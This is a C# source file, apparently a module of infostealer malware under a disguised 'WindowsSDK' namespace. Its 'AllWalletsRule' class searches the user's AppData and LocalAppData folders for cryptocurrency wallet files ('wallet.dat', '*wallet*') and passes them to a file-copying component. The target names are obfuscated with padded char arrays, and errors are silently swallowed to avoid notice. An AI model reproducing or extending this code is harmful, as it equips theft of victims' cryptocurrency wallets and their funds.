using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class AllWalletsRule : FileScannerRule
    {
        public AllWalletsRule()
        {
            base.Name = "Other";
        }

        public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
        {
            return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty);
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                List<string> list2 = new List<string>();
                list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 2, 1, new string(new char[19]
                {
                    'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 'a', 's',
                    'f', 't', '.', 'd', 'a', 't', 'a', 's', 'f'
                }).Replace("asf", string.Empty), new string(new char[12]
                {
                    'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 't', 'a',
                    's', 'f'
                }).Replace("asf", string.Empty)));
                list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 2, 1, new string(new char[19]
                {
                    'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 'a', 's',
                    'f', 't', '.', 'd', 'a', 't', 'a', 's', 'f'
                }).Replace("asf", string.Empty), new string(new char[12]
                {
                    'w', 'a', 'a', 's', 'f', 'l', 'l', 'e', 't', 'a',
                    's', 'f'
                }).Replace("asf", string.Empty)));
                try
                {
                    foreach (string item in list2)
                    {
                        list.Add(new FileScannerArg
                        {
                            Directory = new FileInfo(item).Directory.FullName,
                            Pattern = "*wallet*",
                            Recoursive = false
                        });
                    }
                }
                catch
                {
                }
            }
            catch
            {
            }
            return list;
        }
    }
}
